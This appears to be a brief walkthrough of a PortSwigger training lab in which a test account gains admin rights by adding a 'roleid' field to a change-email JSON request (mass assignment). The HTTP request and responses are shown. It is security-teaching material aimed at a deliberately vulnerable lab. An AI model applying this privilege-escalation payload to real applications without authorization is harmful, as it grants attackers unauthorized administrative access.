# [Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)

This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

login to `wiener` account and test the change email function

original request:

```http
POST /my-account/change-email HTTP/1.1

{"email":"test@test.test"}
```

- response:

  ```json
  {
    "username": "wiener",
    "email": "test@test.test",
    "apikey": "NaQGHqoeUSzZMM40xGobvSXR4i0SJyPu",
    "roleid": 1
  }
  ```

## Solutions

fake `roleid` field in `change email` request body:

```json
{"email":"test@test.test", "roleid":2}
```

- response:

  ```json
  {
    "username": "wiener",
    "email": "test@test.test",
    "apikey": "NaQGHqoeUSzZMM40xGobvSXR4i0SJyPu",
    "roleid": 2
  }
  ```

=> now we can access to `/admin` endpoint.
